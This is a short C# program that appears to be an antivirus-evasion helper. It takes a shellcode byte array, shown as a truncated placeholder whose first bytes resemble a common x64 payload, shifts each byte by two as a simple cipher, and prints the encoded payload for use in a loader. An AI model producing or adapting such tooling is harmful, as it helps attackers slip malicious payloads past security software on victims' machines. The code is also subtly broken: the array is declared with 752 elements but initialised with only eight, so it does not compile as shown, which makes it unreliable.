using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // Define the shellcode byte array (example shellcode here)
            byte[] buf = new byte[752] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0, /* ... remaining bytes ... */ 
                0x90, 0x90, 0x90 // Adjust size and content as needed
            };

            // Array to hold the encrypted shellcode
            byte[] encoded = new byte[buf.Length];
            
            // Caesar Cipher Encryption with a key of 2
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF); // Adds 2 and ensures value is within byte range
            }

            // Convert encrypted byte array to a formatted hex string
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b); // Format as hexadecimal (0xXX) for each byte
            }

            // Output the encrypted shellcode
            Console.WriteLine("The encrypted payload is: ");
            Console.WriteLine(hex.ToString());
        }
    }
}
